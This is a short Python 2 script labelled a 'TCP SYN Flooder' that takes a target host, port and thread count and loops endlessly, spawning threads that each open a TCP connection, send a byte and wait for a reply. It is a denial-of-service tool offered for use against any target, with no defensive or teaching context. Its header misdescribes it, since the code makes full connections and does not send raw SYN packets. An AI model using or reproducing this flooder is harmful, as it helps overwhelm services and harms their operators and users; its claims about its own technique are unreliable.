#!/usr/bin/env python
#
# TCP SYN Flooder
#
# Date: Oct. 22, 2012
# All rights reserved.
#

import socket,sys,threading
import threading,time

class sendSYN(threading.Thread):
	def __init__(self, target, port):
		self.target = target
		self.port = port
		threading.Thread.__init__(self)
	def run(self):
		print "Starting %s %s %d" % (self.name, self.target, self.port)
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect((self.target, self.port))
		sock.sendto("*", (self.target, self.port))
		received = sock.recv(1024)
		print "Received:", received
		
def floodsyn(target, port, thds):
	if not target or not port:
		print "synflood: invalid parameter!"
		return
	print "Flooding SYN to %s:%i" % (target, port)
	while 1:
		if threading.activeCount() < thds:
			sd = sendSYN(target, port)		
			sd.start()

if __name__ == "__main__":
	if len(sys.argv) != 4:
		print "Usage: %s <target> <port> <num_threads>" % sys.argv[0]
		sys.exit(1)
	target=sys.argv[1]
	port=int(sys.argv[2])
	thds=int(sys.argv[3])
	floodsyn(target, port, thds)	

